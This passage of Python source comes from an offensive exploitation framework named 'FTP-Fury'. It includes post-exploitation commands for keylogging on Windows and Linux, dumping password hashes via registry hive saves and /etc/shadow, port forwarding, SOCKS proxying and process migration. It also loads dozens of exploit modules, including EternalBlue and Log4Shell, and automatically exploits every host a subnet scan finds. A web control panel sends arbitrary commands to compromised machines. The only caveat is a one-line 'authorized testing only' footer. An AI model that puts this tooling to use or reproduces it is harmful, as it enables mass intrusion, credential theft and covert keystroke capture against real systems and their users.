            if not ps_output:
                print(f"{Color.RED}[!] Cannot get process list{Color.RESET}")
                return
            
            lines = ps_output.split('\n')
            for line in lines:
                if 'python' in line or 'bash' in line or 'sh' in line:
                    parts = line.split()
                    if len(parts) > 1 and parts[1].isdigit():
                        pid = parts[1]
                        print(f"{Color.GREEN}[+] Found suitable process: {pid}{Color.RESET}")
                        self.pid = pid
                        break
            
            if self.pid:
                print(f"{Color.GREEN}[+] Migrated to PID: {self.pid}{Color.RESET}")
            else:
                print(f"{Color.YELLOW}[!] No suitable process found{Color.RESET}")
                
        except Exception as e:
            print(f"{Color.RED}[!] Migration failed: {e}{Color.RESET}")
    
    def _handle_portfwd(self, args: str):
        parts = args.split()
        if len(parts) < 4:
            print(f"{Color.YELLOW}Usage: portfwd <local_port> <remote_host> <remote_port>{Color.RESET}")
            return
        
        local_port = int(parts[0])
        remote_host = parts[1]
        remote_port = int(parts[2])
        
        try:
            cmd = f"socat TCP-LISTEN:{local_port},fork TCP:{remote_host}:{remote_port} &"
            self.send_command(cmd)
            print(f"{Color.GREEN}[+] Port forwarding: localhost:{local_port} -> {remote_host}:{remote_port}{Color.RESET}")
        except Exception as e:
            print(f"{Color.RED}[!] Port forwarding failed: {e}{Color.RESET}")
    
    def _handle_socks(self):
        try:
            cmd = f"ssh -D {CONFIG['listen_port']} -N -f localhost 2>/dev/null"
            self.send_command(cmd)
            print(f"{Color.GREEN}[+] SOCKS proxy started on port {CONFIG['listen_port']}{Color.RESET}")
        except Exception as e:
            print(f"{Color.RED}[!] SOCKS proxy failed: {e}{Color.RESET}")
    
    def _handle_keylogger(self):
        try:
            os_check = self.send_command("uname -s 2>/dev/null")
            is_windows = "MINGW" in os_check or "MSYS" in os_check
            
            if is_windows:
                script = '''
                powershell -Command "
                    $keylogger = @'
                    using System;
                    using System.Diagnostics;
                    using System.Runtime.InteropServices;
                    public class KeyLogger {
                        [DllImport('user32.dll')]
                        public static extern short GetAsyncKeyState(int vKey);
                        public static void Log() {
                            while(true) {
                                for(int i=8; i<255; i++) {
                                    if(GetAsyncKeyState(i) == -32767) {
                                        Console.WriteLine((char)i);
                                    }
                                }
                                System.Threading.Thread.Sleep(10);
                            }
                        }
                    }
                    '@;
                    Add-Type -TypeDefinition $keylogger -Language CSharp;
                    [KeyLogger]::Log() > C:\\Windows\\Temp\\keylog.txt
                "
                '''
            else:
                script = '''
                echo '#!/bin/bash
                while true; do
                    read -sn1 key
                    echo "$(date): $key" >> /tmp/keylog.txt
                done' > /tmp/keylogger.sh
                chmod +x /tmp/keylogger.sh
                nohup /tmp/keylogger.sh > /dev/null 2>&1 &
                '''
            
            self.send_command(script)
            print(f"{Color.GREEN}[+] Keylogger started{Color.RESET}")
            
        except Exception as e:
            print(f"{Color.RED}[!] Keylogger failed: {e}{Color.RESET}")
    
    def _handle_hashdump(self):
        try:
            os_check = self.send_command("uname -s 2>/dev/null")
            is_windows = "MINGW" in os_check or "MSYS" in os_check
            
            if is_windows:
                script = '''
                reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save
                reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save
                reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.save
                '''
                output = self.send_command(script)
                if output:
                    print(f"{Color.GREEN}[+] Registry hives saved{Color.RESET}")
                else:
                    print(f"{Color.YELLOW}[!] Failed to save registry hives{Color.RESET}")
            else:
                script = '''
                cat /etc/shadow 2>/dev/null || cat /etc/passwd 2>/dev/null
                '''
                output = self.send_command(script)
                if output:
                    print(f"{Color.GREEN}[+] Hashes dumped:{Color.RESET}")
                    print(output)
                else:
                    print(f"{Color.YELLOW}[!] No hashes found{Color.RESET}")
                
        except Exception as e:
            print(f"{Color.RED}[!] Hash dump failed: {e}{Color.RESET}")
    
    def _show_help(self):
        help_text = f"""
{Color.BOLD}{Color.CYAN}Available Commands:{Color.RESET}
  {Color.GREEN}help{Color.RESET}                  Show this help
  {Color.GREEN}exit{Color.RESET}                  Close session
  {Color.GREEN}upload <local> <remote>{Color.RESET}  Upload file to target
  {Color.GREEN}download <remote> <local>{Color.RESET}  Download file from target
  {Color.GREEN}screenshot{Color.RESET}            Take screenshot
  {Color.GREEN}ps{Color.RESET}                    Show process list
  {Color.GREEN}netstat{Color.RESET}               Show network connections
  {Color.GREEN}find <pattern>{Color.RESET}        Find files matching pattern
  {Color.GREEN}persist{Color.RESET}               Establish persistence
  {Color.GREEN}migrate{Color.RESET}               Migrate to another process
  {Color.GREEN}portfwd <lp> <rh> <rp>{Color.RESET} Port forwarding
  {Color.GREEN}socks{Color.RESET}                 Setup SOCKS proxy
  {Color.GREEN}keylog{Color.RESET}                Start keylogger
  {Color.GREEN}hashdump{Color.RESET}              Dump password hashes
  {Color.GREEN}!<command>{Color.RESET}            Execute local command

{Color.DIM}[+] You can run any system command on the target{Color.RESET}
        """
        print(help_text)
    
    def close(self):
        if self.alive:
            self.alive = False
            try:
                self.socket.close()
            except:
                pass
            print(f"{Color.GREEN}[+] Session {self.id} closed{Color.RESET}")

# ============================================================
# EXPLOIT MODULE BASE CLASS
# ============================================================

class ExploitModule(ABC):
    def __init__(self, name: str, cve: str, description: str = "", author: str = "SYLHETYHACKVENGER"):
        self.name = name
        self.cve = cve
        self.description = description
        self.author = author
        self.vulnerable = False
        self.detection_count = 0
        self.exploit_count = 0
        self.success_count = 0
        self.targets_checked = set()
        self.options = {}
        self.requirements = []
        self.last_used = None
        self.metadata = {
            'name': name,
            'cve': cve,
            'description': description,
            'author': author,
            'type': 'unknown',
            'risk': 'high',
            'impact': 'full'
        }
    
    @abstractmethod
    def detect(self, target: str) -> bool:
        pass
    
    @abstractmethod
    def exploit(self, target: str, **kwargs) -> Optional[AdvancedShellSession]:
        pass
    
    def check_prerequisites(self) -> bool:
        return True
    
    def cleanup(self):
        pass
    
    def get_stats(self) -> Dict:
        return {
            'name': self.name,
            'cve': self.cve,
            'detections': self.detection_count,
            'exploits': self.exploit_count,
            'successes': self.success_count,
            'success_rate': (self.success_count / self.exploit_count * 100) if self.exploit_count > 0 else 0
        }
    
    def set_option(self, key: str, value: Any):
        self.options[key] = value
    
    def get_option(self, key: str, default: Any = None) -> Any:
        return self.options.get(key, default)

# ============================================================
# EXPLOIT FRAMEWORK
# ============================================================

class ExploitFramework:
    def __init__(self):
        self.modules = []
        self.db = DatabaseManager()
        self.session_manager = SessionManager(self.db)
        self.targets = {}
        self.web_app = None
        self.web_thread = None
        self.running = True
        self.auto_exploit_queue = queue.Queue()
        self.exploit_threads = []
        self.learning_data = {}
        self.priority_queue = []
        self.known_exploits = set()
        self.max_concurrent_exploits = 10
        self.exploit_semaphore = threading.Semaphore(self.max_concurrent_exploits)
        self.credential_manager = None
        self.payload_cache = {}
        self.scan_history = []
        self.load_modules()
        self._load_credentials()
        if FLASK_AVAILABLE:
            self.setup_web_panel()
        self.session_manager.start_keepalive()
        self.start_auto_exploit_worker()
        self.start_stats_thread()
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        print(f"\n{Color.YELLOW}[!] Shutting down...{Color.RESET}")
        self.running = False
        self.session_manager.stop()
        self.db.close()
        sys.exit(0)
    
    def _load_credentials(self):
        creds = self.db.get_credentials()
        self.credential_manager = CredentialManager(creds)
    
    def load_modules(self):
        self.modules = [
            VSFTPDModule(),
            ShellshockModule(),
            Log4ShellModule(),
            CiscoISEModule(),
            CactiModule(),
            EternalBlueModule(),
            Struts2Module(),
            JenkinsModule(),
            RedisModule(),
            TomcatModule(),
            HeartbleedModule(),
            DrupalModule(),
            WordPressModule(),
            JoomlaModule(),
            MySQLModule(),
            PostgreSQLModule(),
            MSSQLModule(),
            SMBModule(),
            RDPModule(),
            SSHModule(),
            TelnetModule(),
            SNMPModule(),
            DNSModule(),
            DHCPModule(),
            NTPModule(),
            LDAPModule(),
            KerberosModule(),
            NFSModule(),
            FTPModule(),
            HTTPModule(),
            HTTPSModule(),
            ApacheModule(),
            NginxModule(),
            IISModule(),
            WebLogicModule(),
            WebSphereModule(),
            GlassFishModule(),
            JBossModule(),
            WildFlyModule()
        ]
        logger.info(f"{Color.GREEN}[+] Loaded {len(self.modules)} exploit modules{Color.RESET}")
    
    def start_stats_thread(self):
        def stats_loop():
            while self.running:
                time.sleep(60)
                stats = self.db.get_stats()
                logger.debug(f"Stats: {stats}")
        
        thread = threading.Thread(target=stats_loop, daemon=True)
        thread.start()
    
    def start_auto_exploit_worker(self):
        def worker_loop():
            while self.running:
                try:
                    target = self.auto_exploit_queue.get(timeout=5)
                    self.exploit_semaphore.acquire()
                    thread = threading.Thread(target=self._auto_exploit_target, args=(target,))
                    thread.daemon = True
                    thread.start()
                    self.exploit_threads.append(thread)
                except queue.Empty:
                    continue
                except:
                    continue
        
        worker_thread = threading.Thread(target=worker_loop, daemon=True)
        worker_thread.start()
    
    def _auto_exploit_target(self, target: str):
        try:
            logger.info(f"{Color.CYAN}[*] Auto-exploiting {target}{Color.RESET}")
            
            sorted_modules = sorted(
                self.modules,
                key=lambda m: (
                    m.get_stats()['success_rate'] if m.get_stats()['exploits'] > 0 else 0,
                    m.metadata.get('risk') == 'high',
                    m.detection_count
                ),
                reverse=True
            )
            
            for module in sorted_modules:
                if not self.running:
                    break
                    
                try:
                    if module.detect(target):
                        logger.info(f"{Color.GREEN}[+] {target} vulnerable to {module.cve}{Color.RESET}")
                        session = module.exploit(target)
                        if session:
                            self.session_manager.add_session(session)
                            logger.info(f"{Color.GREEN}[+] Exploited {target} with {module.cve}{Color.RESET}")
                            break
                except Exception as e:
                    logger.debug(f"Module {module.name} failed: {e}")
                    continue
                    
        except Exception as e:
            logger.error(f"Auto-exploit failed for {target}: {e}")
        finally:
            self.exploit_semaphore.release()
    
    def scan_network(self, subnet: str, ports: List[int] = None, aggressive: bool = False) -> List[Target]:
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 
                    1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017, 9200, 9300,
                    1433, 1521, 3306, 5432, 5984, 9092, 27017]
        
        logger.info(f"{Color.CYAN}[*] Scanning network {subnet}{Color.RESET}")
        targets = []
        start_time = time.time()
        
        try:
            network = ipaddress.ip_network(subnet, strict=False)
            total_hosts = sum(1 for _ in network.hosts())
            
            progress = 0
            
            def scan_ip(ip):
                target = Target(ip=str(ip))
                
                try:
                    target.hostname = socket.gethostbyaddr(str(ip))[0]
                except:
                    pass
                
                for port in ports:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1)
                        result = s.connect_ex((str(ip), port))
                        if result == 0:
                            target.ports.append(port)
                            
                            try:
                                s.settimeout(2)
                                s.send(b"\n")
                                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                                target.banners[port] = banner
                                service_info = self._detect_service(banner, port)
                                target.services[port] = service_info
                            except:
                                target.services[port] = self._port_to_service(port)
                        s.close()
                    except:
                        pass
                
                if target.ports:
                    target.os = self._detect_os(target)
                
                return target
            
            with ThreadPoolExecutor(max_workers=CONFIG['max_threads']) as executor:
                futures = {executor.submit(scan_ip, ip): ip for ip in network.hosts()}
                
                for future in as_completed(futures):
                    try:
                        target = future.result()
                        if target.ports:
                            targets.append(target)
                            self.targets[target.ip] = target
                            self.db.add_target(target)
                            
                            if len(targets) % 10 == 0:
                                print(f"{Color.DIM}[+] Found {len(targets)} active targets{Color.RESET}")
                    except:
                        continue
                    
                    progress += 1
                    if progress % 10 == 0:
                        print(f"{Color.DIM}[+] Scanning progress: {progress}/{total_hosts} hosts{Color.RESET}")
            
        except Exception as e:
            logger.error(f"Scan failed: {e}")
            return []
        
        duration = time.time() - start_time
        self.db.add_scan(subnet, len(targets), duration)
        
        logger.info(f"{Color.GREEN}[+] Found {len(targets)} active targets in {duration:.2f}s{Color.RESET}")
        
        if aggressive:
            for target in targets:
                self.auto_exploit_queue.put(target.ip)
        
        return targets
    
    def _detect_service(self, banner: str, port: int) -> str:
        banner_lower = banner.lower()
        
        if 'http' in banner_lower or 'apache' in banner_lower or 'nginx' in banner_lower:
            if 'ssl' in banner_lower or 'tls' in banner_lower:
                return 'https'
            return 'http'
        
        if 'ftp' in banner_lower or 'vsftpd' in banner_lower or 'proftpd' in banner_lower:
            return 'ftp'
        
        if 'ssh' in banner_lower or 'openssh' in banner_lower:
            return 'ssh'
        
        if 'smtp' in banner_lower or 'sendmail' in banner_lower:
            return 'smtp'
        
        if 'pop3' in banner_lower:
            return 'pop3'
        
        if 'imap' in banner_lower:
            return 'imap'
        
        if 'mysql' in banner_lower:
            return 'mysql'
        
        if 'postgresql' in banner_lower:
            return 'postgresql'
        
        if 'redis' in banner_lower:
            return 'redis'
        
        return self._port_to_service(port)
    
    def _port_to_service(self, port: int) -> str:
        service_map = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
            80: 'http', 110: 'pop3', 111: 'rpcbind', 135: 'msrpc',
            139: 'netbios-ssn', 143: 'imap', 443: 'https', 445: 'smb',
            993: 'imaps', 995: 'pop3s', 1433: 'mssql', 1521: 'oracle',
            1723: 'pptp', 3306: 'mysql', 3389: 'rdp', 5432: 'postgresql',
            5900: 'vnc', 6379: 'redis', 8080: 'http-proxy', 8443: 'https-alt',
            9200: 'elasticsearch', 27017: 'mongodb'
        }
        return service_map.get(port, 'unknown')
    
    def _detect_os(self, target: Target) -> str:
        if 445 in target.ports or 3389 in target.ports or 135 in target.ports:
            return "Windows"
        
        if 22 in target.ports or 3306 in target.ports:
            return "Linux/Unix"
        
        for banner in target.banners.values():
            if 'windows' in banner.lower():
                return "Windows"
            if 'linux' in banner.lower() or 'ubuntu' in banner.lower():
                return "Linux"
        
        return "unknown"
    
    def detect_vulnerabilities(self, target: str, comprehensive: bool = False) -> Dict[str, bool]:
        results = {}
        
        modules_to_check = self.modules
        if not comprehensive:
            quick_modules = [m for m in self.modules if m.detection_count < 10]
            modules_to_check = quick_modules + [m for m in self.modules if m not in quick_modules]
        
        for module in modules_to_check:
            try:
                result = module.detect(target)
                results[module.name] = result
                if result:
                    logger.info(f"{Color.GREEN}[+] {target} vulnerable to {module.cve}{Color.RESET}")
                    if target in self.targets:
                        self.targets[target].vulnerabilities.append(module.cve)
                        self.db.add_target(self.targets[target])
            except Exception as e:
                logger.debug(f"Detection failed for {module.name}: {e}")
                results[module.name] = False
        
        return results
    
    def exploit_target(self, target: str, module_name: str = None, options: Dict = None) -> Optional[AdvancedShellSession]:
        if options is None:
            options = {}
        
        if module_name:
            module = next((m for m in self.modules if m.name == module_name), None)
            if module:
                logger.info(f"{Color.CYAN}[*] Exploiting {target} with {module.name}{Color.RESET}")
                for key, value in options.items():
                    module.set_option(key, value)
                session = module.exploit(target)
                if session:
                    self.session_manager.add_session(session)
                    logger.info(f"{Color.GREEN}[+] Exploited {target} with {module.cve}{Color.RESET}")
                    return session
            return None
        
        sorted_modules = sorted(
            self.modules,
            key=lambda m: (
                m.get_stats()['success_rate'] if m.get_stats()['exploits'] > 0 else 0,
                self.known_exploits.intersection({m.cve})
            ),
            reverse=True
        )
        
        for module in sorted_modules:
            try:
                if module.detect(target):
                    logger.info(f"{Color.CYAN}[*] Exploiting {target} with {module.name}{Color.RESET}")
                    for key, value in options.items():
                        module.set_option(key, value)
                    session = module.exploit(target)
                    if session:
                        self.session_manager.add_session(session)
                        self.known_exploits.add(module.cve)
                        logger.info(f"{Color.GREEN}[+] Exploited {target} with {module.cve}{Color.RESET}")
                        return session
            except Exception as e:
                logger.debug(f"Module {module.name} failed: {e}")
                continue
        
        logger.warning(f"{Color.YELLOW}[!] No exploit succeeded on {target}{Color.RESET}")
        return None
    
    def setup_web_panel(self):
        if not FLASK_AVAILABLE:
            logger.warning(f"{Color.YELLOW}[!] Flask not installed. Web panel disabled.{Color.RESET}")
            logger.info(f"{Color.DIM}[+] Install with: pip install flask{Color.RESET}")
            return
            
        app = Flask(__name__)
        app.secret_key = os.urandom(24)
        
        @app.route('/')
        def dashboard():
            return self._render_dashboard()
        
        @app.route('/api/targets')
        def api_targets():
            return jsonify([t.to_dict() for t in self.targets.values()])
        
        @app.route('/api/sessions')
        def api_sessions():
            return jsonify(self.session_manager.list_sessions())
        
        @app.route('/api/modules')
        def api_modules():
            return jsonify([m.get_stats() for m in self.modules])
        
        @app.route('/api/scan', methods=['POST'])
        def api_scan():
            data = request.json
            subnet = data.get('subnet')
            ports = data.get('ports')
            aggressive = data.get('aggressive', False)
            
            if not subnet:
                return jsonify({'error': 'Subnet required'}), 400
            
            targets = self.scan_network(subnet, ports, aggressive)
            return jsonify([t.to_dict() for t in targets])
        
        @app.route('/api/exploit', methods=['POST'])
        def api_exploit():
            data = request.json
            target = data.get('target')
            module = data.get('module')
            options = data.get('options', {})
            
            if not target:
                return jsonify({'error': 'Target required'}), 400
            
            session = self.exploit_target(target, module, options)
            if session:
                return jsonify({
                    'success': True,
                    'session_id': session.id,
                    'target': target,
                    'user': session.user
                })
            else:
                return jsonify({'success': False, 'error': 'Exploit failed'}), 500
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            session_id = data.get('session_id')
            command = data.get('command')
            
            session = self.session_manager.get_session(session_id)
            if not session:
                return jsonify({'success': False, 'error': 'Session not found'}), 404
            
            output = session.send_command(command)
            return jsonify({'success': True, 'output': output})
        
        @app.route('/api/credentials')
        def api_credentials():
            creds = self.db.get_credentials()
            return jsonify([c.to_dict() for c in creds])
        
        @app.route('/api/stats')
        def api_stats():
            return jsonify(self.db.get_stats())
        
        @app.route('/api/clear', methods=['POST'])
        def api_clear():
            self.targets.clear()
            for module in self.modules:
                module.targets_checked.clear()
            return jsonify({'success': True})
        
        @app.route('/shell/<session_id>')
        def shell_interface(session_id):
            session = self.session_manager.get_session(session_id)
            if not session:
                return "Session not found", 404
            return self._render_shell(session)
        
        self.web_app = app
    
    def _render_dashboard(self):
        targets = list(self.targets.values())
        sessions = self.session_manager.list_sessions()
        stats = self.db.get_stats()
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>FTP-Fury Ultimate Dashboard</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{
                    font-family: 'Courier New', monospace;
                    background: #0a0a0a;
                    color: #00ff00;
                    padding: 20px;
                    min-height: 100vh;
                }}
                .header {{
                    border-bottom: 2px solid #00ff00;
                    padding-bottom: 10px;
                    margin-bottom: 20px;
                    display: flex;
                    justify-content: space-between;
                    flex-wrap: wrap;
                }}
                .header h1 {{
                    color: #00ff00;
                    text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
                    font-size: 32px;
                }}
                .stats {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                    gap: 15px;
                    margin-bottom: 20px;
                }}
                .stat-box {{
                    border: 1px solid #00ff00;
                    padding: 15px;
                    text-align: center;
                    background: #0a0a0a;
                }}
                .stat-box .number {{
                    font-size: 28px;
                    font-weight: bold;
                }}
                table {{
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 20px;
                }}
                th, td {{
                    border: 1px solid #00ff00;
                    padding: 10px;
                    text-align: left;
                }}
                th {{
                    background: #1a1a1a;
                    text-transform: uppercase;
                }}
                a {{
                    color: #00ff00;
                    text-decoration: none;
                    border: 1px solid #00ff00;
                    padding: 3px 10px;
                    display: inline-block;
                    margin: 2px;
                }}
                a:hover {{ background: #00ff00; color: #0a0a0a; }}
                .form {{
                    margin: 20px 0;
                    padding: 20px;
                    border: 1px solid #00ff00;
                    background: #0a0a0a;
                }}
                .form input, .form select {{
                    background: #1a1a1a;
                    color: #00ff00;
                    border: 1px solid #00ff00;
                    padding: 8px;
                    margin: 5px;
                    font-family: monospace;
                }}
                .form button {{
                    background: #00ff00;
                    color: #0a0a0a;
                    border: none;
                    padding: 8px 20px;
                    cursor: pointer;
                    font-weight: bold;
                }}
                .status-ok {{ color: #00ff00; }}
                .status-error {{ color: #ff0000; }}
                .footer {{
                    margin-top: 20px;
                    padding-top: 10px;
                    border-top: 1px solid #333;
                    text-align: center;
                    color: #666;
                    font-size: 12px;
                }}
            </style>
        </head>
        <body>
            <div class="header">
                <div>
                    <h1>🔥 FTP-Fury</h1>
                    <div style="font-size: 12px; color: #666;">Ultimate Exploitation Framework</div>
                </div>
                <div style="text-align: right;">
                    <div>Author: SYLHETYHACKVENGER</div>
                    <div style="font-size: 12px; color: #666;">
                        Active Since: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                    </div>
                </div>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="number">{stats.get('targets', 0)}</div>
                    <div class="label">🎯 Targets</div>
                </div>
                <div class="stat-box">
                    <div class="number">{stats.get('sessions', 0)}</div>
                    <div class="label">💻 Sessions</div>
                </div>
                <div class="stat-box">
                    <div class="number">{len(self.modules)}</div>
                    <div class="label">🧩 Modules</div>
                </div>
                <div class="stat-box">
                    <div class="number">{stats.get('exploits', 0)}</div>
                    <div class="label">⚡ Exploits</div>
                </div>
                <div class="stat-box">
                    <div class="number">{stats.get('credentials', 0)}</div>
                    <div class="label">🔑 Credentials</div>
                </div>
                <div class="stat-box">
                    <div class="number">{stats.get('scans', 0)}</div>
                    <div class="label">📡 Scans</div>
                </div>
            </div>
            
            <div class="form">
                <h3>📡 Scan Network</h3>
                <form id="scanForm" onsubmit="scanNetwork(event)">
                    <input type="text" id="networkInput" placeholder="192.168.1.0/24" required>
                    <input type="text" id="portsInput" placeholder="21,22,80,443">
                    <label>
                        <input type="checkbox" id="aggressiveMode"> Aggressive
                    </label>
                    <button type="submit">🔍 Scan</button>
                </form>
                <div id="scanProgress" style="display:none; margin-top:10px;">
                    <div style="border:1px solid #00ff00; height:20px;">
                        <div id="progressBar" style="width:0%; height:100%; background:#00ff00;"></div>
                    </div>
                </div>
            </div>
            
            <div class="form">
                <h3>🎯 Exploit Target</h3>
                <form id="exploitForm" onsubmit="exploitTarget(event)">
                    <input type="text" id="targetInput" placeholder="Target IP" required>
                    <select id="moduleSelect">
                        <option value="">Auto-Exploit</option>
                        {''.join(f'<option value="{m.name}">{m.name} ({m.cve})</option>' for m in self.modules)}
                    </select>
                    <button type="submit">🚀 Exploit</button>
                </form>
                <div id="exploitResult" style="margin-top:10px; display:none;"></div>
            </div>
            
            <h3>🎯 Active Targets</h3>
            <table>
                <thead>
                    <tr>
                        <th>IP</th>
                        <th>Hostname</th>
                        <th>Ports</th>
                        <th>Services</th>
                        <th>OS</th>
                        <th>Vulnerabilities</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    {''.join(f'''
                    <tr>
                        <td><strong>{t.ip}</strong></td>
                        <td>{t.hostname or 'Unknown'}</td>
                        <td>{', '.join(map(str, t.ports[:5]))}{'...' if len(t.ports) > 5 else ''}</td>
                        <td>{', '.join(set(t.services.values())[:3])}</td>
                        <td>{t.os}</td>
                        <td>{', '.join(t.vulnerabilities[:3])}{'...' if len(t.vulnerabilities) > 3 else ''}</td>
                        <td>
                            <a href="#" onclick="exploitIP('{t.ip}')">💥 Exploit</a>
                            <a href="#" onclick="scanTarget('{t.ip}')">🔍 Scan</a>
                        </td>
                    </tr>
                    ''' for t in targets[:20])}
                    {'' if targets else '<tr><td colspan="7" style="text-align:center;color:#666;">No targets scanned yet</td></tr>'}
                </tbody>
            </table>
            
            <h3>💻 Active Sessions</h3>
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Target</th>
                        <th>User</th>
                        <th>Type</th>
                        <th>Created</th>
                        <th>Status</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    {''.join(f'''
                    <tr>
                        <td><strong>{s['id']}</strong></td>
                        <td>{s['target']}</td>
                        <td>{s['user']}</td>
                        <td>{s['type']}</td>
                        <td>{s['created']}</td>
                        <td class="status-{'ok' if s['alive'] else 'error'}">{'🟢 Alive' if s['alive'] else '🔴 Dead'}</td>
                        <td><a href="/shell/{s['id']}" target="_blank">💻 Connect</a></td>
                    </tr>
                    ''' for s in sessions[:10])}
                    {'' if sessions else '<tr><td colspan="7" style="text-align:center;color:#666;">No active sessions</td></tr>'}
                </tbody>
            </table>
            
            <div style="margin-top:20px; display:flex; gap:20px; flex-wrap:wrap;">
                <a href="#" onclick="refreshData()">🔄 Refresh</a>
                <a href="#" onclick="clearAll()">🗑️ Clear All</a>
            </div>
            
            <div class="footer">
                FTP-Fury Ultimate Framework | For authorized security testing only
            </div>
            
            <script>
                function scanNetwork(event) {{
                    event.preventDefault();
                    const network = document.getElementById('networkInput').value;
                    const ports = document.getElementById('portsInput').value;
                    const aggressive = document.getElementById('aggressiveMode').checked;
                    
                    document.getElementById('scanProgress').style.display = 'block';
                    
                    fetch('/api/scan', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{
                            subnet: network, 
                            ports: ports.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p)),
                            aggressive
                        }})
                    }})
                    .then(r => r.json())
                    .then(data => {{
                        document.getElementById('scanProgress').style.display = 'none';
                        alert('✅ Scan completed! Found ' + data.length + ' targets');
                        location.reload();
                    }});
                }}
                
                function exploitTarget(event) {{
                    event.preventDefault();
                    const target = document.getElementById('targetInput').value;
                    const module = document.getElementById('moduleSelect').value;
                    
                    const result = document.getElementById('exploitResult');
                    result.style.display = 'block';
                    result.innerHTML = '⏳ Exploiting ' + target + '...';
                    result.style.color = '#ffff00';
                    
                    fetch('/api/exploit', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{target, module}})
                    }})
                    .then(r => r.json())
                    .then(data => {{
                        if (data.success) {{
                            result.innerHTML = '✅ Success! Session: ' + data.session_id;
                            result.style.color = '#00ff00';
                        }} else {{
                            result.innerHTML = '❌ Failed: ' + (data.error || 'Unknown error');
                            result.style.color = '#ff0000';
                        }}
                    }});
                }}
                
                function exploitIP(ip) {{
                    document.getElementById('targetInput').value = ip;
                    document.getElementById('exploitForm').dispatchEvent(new Event('submit'));
                }}
                
                function scanTarget(ip) {{
                    document.getElementById('networkInput').value = ip + '/32';
                    document.getElementById('scanForm').dispatchEvent(new Event('submit'));
                }}
                
                function refreshData() {{
                    location.reload();
                }}
                
                function clearAll() {{
                    if (confirm('⚠️ Clear all targets and sessions?')) {{
                        fetch('/api/clear', {{method: 'POST'}})
                            .then(() => location.reload());
                    }}
                }}
            </script>
        </body>
        </html>
        """
    
    def _render_shell(self, session):
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>FTP-Fury - {session.target}</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{
                    background: #0a0a0a;
                    color: #00ff00;
                    font-family: 'Courier New', monospace;
                    padding: 0;
                    margin: 0;
                    height: 100vh;
                    display: flex;
                    flex-direction: column;
                }}
                #header {{
                    border-bottom: 1px solid #00ff00;
                    padding: 10px 20px;
                    display: flex;
                    justify-content: space-between;
                    background: #000;
                }}
                #output {{
                    flex: 1;
                    overflow-y: auto;
                    padding: 20px;
                    background: #000;
                    white-space: pre-wrap;
                    word-wrap: break-word;
                    line-height: 1.4;
                }}
                #input-container {{
                    display: flex;
                    padding: 10px 20px;
                    border-top: 1px solid #00ff00;
                    background: #000;
                }}
                #prompt {{
                    color: #00ff00;
                    margin-right: 10px;
                }}
                #input {{
                    flex: 1;
                    background: #000;
                    color: #00ff00;
                    border: none;
                    padding: 5px;
                    font-family: 'Courier New', monospace;
                    outline: none;
                    font-size: 14px;
                }}
                #status-bar {{
                    padding: 5px 20px;
                    border-top: 1px solid #00ff00;
                    font-size: 12px;
                    color: #666;
                    background: #000;
                    display: flex;
                    justify-content: space-between;
                }}
            </style>
        </head>
        <body>
            <div id="header">
                <div>
                    <span>💻</span>
                    <span>{session.target}</span>
                    <span style="color:#00ffff;">({session.user})</span>
                </div>
                <div>
                    <span style="color:#00ffff;">Session:</span>
                    <span>{session.id}</span>
                </div>
            </div>
            <div id="output"></div>
            <div id="input-container">
                <span id="prompt">$</span>
                <input type="text" id="input" autofocus spellcheck="false" autocomplete="off">
            </div>
            <div id="status-bar">
                <span id="statusText">Connected</span>
                <span id="timeDisplay"></span>
            </div>
            
            <script>
                const output = document.getElementById('output');
                const input = document.getElementById('input');
                const sessionId = '{session.id}';
                const target = '{session.target}';
                const user = '{session.user}';
                let commandHistory = [];
                let historyIndex = -1;
                
                function scrollToBottom() {{
                    output.scrollTop = output.scrollHeight;
                }}
                
                function updateTime() {{
                    const now = new Date();
                    document.getElementById('timeDisplay').textContent = now.toLocaleString();
                }}
                setInterval(updateTime, 1000);
                updateTime();
                
                function sendCommand(cmd) {{
                    if (!cmd.trim()) return;
                    
                    output.textContent += '\\n' + user + '@' + target + '$ ' + cmd + '\\n';
                    scrollToBottom();
                    
                    fetch('/api/command', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{session_id: sessionId, command: cmd}})
                    }})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            if (data.output) {{
                                output.textContent += data.output + '\\n';
                            }}
                            document.getElementById('statusText').textContent = '✓ OK';
                            document.getElementById('statusText').style.color = '#00ff00';
                        }} else {{
                            output.textContent += '❌ Error: ' + data.error + '\\n';
                            document.getElementById('statusText').textContent = '✗ Error';
                            document.getElementById('statusText').style.color = '#ff0000';
                        }}
                        scrollToBottom();
                    }});
                }}
                
                input.addEventListener('keydown', function(e) {{
                    if (e.key === 'Enter') {{
                        const cmd = this.value;
                        if (cmd.trim().toLowerCase() === 'exit') {{
